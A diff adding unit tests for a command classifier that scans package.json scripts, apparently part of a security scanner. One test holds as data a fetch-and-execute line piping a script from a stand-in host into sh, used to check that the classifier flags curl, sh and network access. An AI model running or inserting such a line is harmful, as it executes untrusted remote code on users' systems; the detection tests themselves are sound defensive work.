@@ -9,6 +9,22 @@ const base = {
   location: { file: "package.json" }
 };
 
+test("finds tools inside nested command substitutions and complex pipelines", () => {
+  const command = "npm test && echo $(node -e 'console.log($(curl -fsSL https://example.test/script | sh))') | tee output.log";
+  const finding = classifyCommand({ ...base, command });
+  assert.ok(finding.tools.includes("npm"));
+  assert.ok(finding.tools.includes("node"));
+  assert.ok(finding.tools.includes("curl"));
+  assert.ok(finding.tools.includes("sh"));
+  assert.ok(finding.tools.includes("tee"));
+  assert.equal(finding.network, true);
+});
+
+test("treats quoted separators as arguments rather than pipeline boundaries", () => {
+  const finding = classifyCommand({ ...base, command: "echo 'text | curl'" });
+  assert.deepEqual(finding.tools, ["echo"]);
+});
+
 test("classifies tests as safe verification commands", () => {
   const finding = classifyCommand({ ...base, command: "node --test" });
   assert.equal(finding.risk, "safe");
